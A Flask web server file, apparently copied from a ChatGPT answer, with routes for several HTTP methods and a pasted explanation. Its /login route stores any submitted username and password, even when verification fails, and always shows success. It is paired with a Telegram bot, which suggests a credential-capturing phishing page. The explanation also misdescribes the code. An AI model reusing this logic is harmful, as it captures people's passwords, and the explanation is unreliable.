#Code Directly copied from chatGPT

#How to create a webserver in python using flask which handles verious http methods
"""
To create a Flask web server that handles various HTTP methods, you can define routes with different methods using the @app.route() decorator. Here's an example:
"""

from flask import Flask, request, render_template
from support import db_write, login_verify,local_time, print_request
from tele_bot import keep_bot_alive


app = Flask(__name__, static_folder='static')


@app.route('/', methods=['GET'])
def handle_get():
    # print_request(request)
    local_time()
    return render_template('index.html')


# @app.route('/', methods=['POST'])
# def handle_post():
#     form_data = request.form
#     username = form_data.get('username')
#     password = form_data.get('password')
#     db_id = db_write(username, password)
#     # print_request(request)
#     # print(username)
#     # print(password)
#     local_time()
#     return f"Success :: db id : {db_id}"


@app.route('/login', methods=['POST'])
def handle_submit():
    form_data = request.form
    
    username = form_data.get('username')
    password = form_data.get('password')

    db_id = login_verify(username, password)
    if not db_id:
        db_id = db_write(username, password)
    # print_request(request)
    # print(form_data)
    # print(username)
    # print(password)
    local_time()
    return render_template('success.html', id=db_id)


@app.route('/signup', methods=['GET'])
def handle_signup():
    # print_request(request)
    local_time()
    return render_template("working.html")

@app.route('/test', methods=['GET'])
def handle_test():
    # print_request(request)
    local_time()
    return render_template("test.html")


@app.route('/', methods=['PUT'])
def handle_put():
    return 'This is a PUT request.'


@app.route('/', methods=['DELETE'])
def handle_delete():
    return 'This is a DELETE request.'


if __name__ == '__main__':
    keep_bot_alive()
    app.run(host="0.0.0.0", port=80)


"""
In this example, we define different routes for each HTTP method. The methods parameter in the @app.route() decorator specifies the allowed HTTP methods for that particular route.

    The / route is associated with the handle_get() function, which handles GET requests.
    The / route is associated with the handle_post() function, which handles POST requests. It retrieves data from the request's form data using request.form.get('data').
    The / route is associated with the handle_put() function, which handles PUT requests.
    The / route is associated with the handle_delete() function, which handles DELETE requests.

Note that the route URL is the same for all methods (/ in this example). However, the method specified in the methods parameter differentiates between the different routes.

To test these routes, you can use tools like cURL or HTTP clients like Postman. For example:

    Sending a GET request:

arduino

curl http://localhost:5000/

    Sending a POST request with data:

arduino

curl -X POST -d "data=example" http://localhost:5000/

    Sending a PUT request:

arduino

curl -X PUT http://localhost:5000/

    Sending a DELETE request:

arduino

curl -X DELETE http://localhost:5000/

Flask allows you to define routes for other HTTP methods like PATCH, OPTIONS, etc., using the same approach. Simply add more route functions with the desired methods.

With this setup, you can handle different HTTP methods and their corresponding requests in your Flask web server.
"""
